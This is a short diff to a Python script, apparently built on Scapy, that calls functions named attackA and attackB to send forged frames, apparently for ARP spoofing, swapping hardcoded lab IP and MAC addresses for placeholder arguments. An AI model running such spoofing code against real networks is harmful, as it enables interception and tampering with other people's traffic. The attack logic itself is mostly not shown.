@@ -41,5 +41,5 @@ def attackB(ipa_dest,mac_dest,victim_ip,fake_mac):
         sendp(frame)
 
 
-attackA("192.168.100.6","08:00:27:aa:11:2f","192.168.100.5","08:00:27:ca:db:c0")
-attackB("192.168.100.5","08:00:27:f2:d3:23","192.168.100.6","08:00:27:ca:db:c0")
+attackA(ipa_dest,mac_dest,victim_ip,fake_mac)#Enter the respective arguments
+attackB(ipa_dest,mac_dest,victim_ip,fake_mac)#Enter the respective arguments
